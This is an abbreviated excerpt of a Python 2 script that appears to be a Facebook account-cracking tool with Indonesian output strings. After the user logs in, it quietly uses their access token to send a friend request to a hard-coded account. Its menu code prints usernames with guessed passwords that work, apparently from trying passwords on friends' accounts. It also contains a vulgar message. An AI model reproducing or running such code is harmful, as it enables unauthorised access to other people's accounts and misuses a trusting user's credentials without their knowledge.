...
def login():
    ...
    try:
        ...
        print '[*]LOGIN AKUN FACEBOOK DULU[*]'
        ...
        if 'save-device' in url:
            try:
                ...
                zedd.close()
                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mBAU MEMEKK'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcTL8_I5EbZLNlmQiAGMaETVMFpLYCF6pjq3KJ85SZ1Fqzqhw6Dn')
                time.sleep(2)
                menu()
...
def menu():
    ...
    print '\x1b[1;37;40m1. Friends Information'
                            ...
                            if 'access_token' in q:
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    if 'access_token' in q:
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[\x1b[1;93mOk\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
        except:
            pass
